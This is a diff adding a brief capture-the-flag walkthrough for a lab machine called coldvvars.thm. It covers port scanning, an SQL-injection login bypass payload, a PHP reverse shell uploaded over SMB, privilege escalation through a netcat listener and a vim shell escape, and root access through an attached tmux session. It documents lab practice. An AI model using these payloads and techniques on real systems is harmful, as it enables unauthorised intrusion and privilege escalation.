@@ -1,0 +1,47 @@
+1. Enumerate ports
+    139/tcp  open  netbios-ssn
+    445/tcp  open  netbios-ssn
+    8080/tcp open  http
+    8082/tcp open  http
+
+2. Enumerate directories on coldvvars.thm:8082
+    http://coldvvars.thm:8082/login
+    http://coldvvars.thm:8082/dev
+
+3. Bypass login auth
+    payload = (' or '=' 1#)
+    Get passwd file.
+
+4. Login to smb on 445 port
+    Put payload.php and get reverse shell :)
+    Login to ArthurMorgan
+    Get user flag !
+
+5. Privilege escalation (morston)
+    $ env
+    ...
+    OPEN_PORTS=4545
+    $ nc localhost 4545
+    $ netstat -tunlp 4545
+    But I d'nt get nothing !
+    $ nc -l 4545
+    Get vim
+    :!/bin/bash
+    And I get shell ! :)
+    Shell stabilization
+    python3 -c "import pty;pty.spawn('/bin/bash')"
+    <Ctrl+Z>
+    stty -echo raw;fg
+    morston@coldvvars:~$ export TERM=xterm-256color
+
+6. Privilege escalation (root)
+    morston@coldvvars:~$ ps aux | grep "root"
+    ...
+    tmux
+    ...
+    morston@coldvvars:~$ tmux ls
+    0: 9 windows (created Wed Jan  5 20:33:31 2022) (attached)
+    morston@coldvvars:~$ tmux attach -t 0
+    And I get root shell !!!
+    !!! GET ROOT FLAG !!! :D
+Thanks!
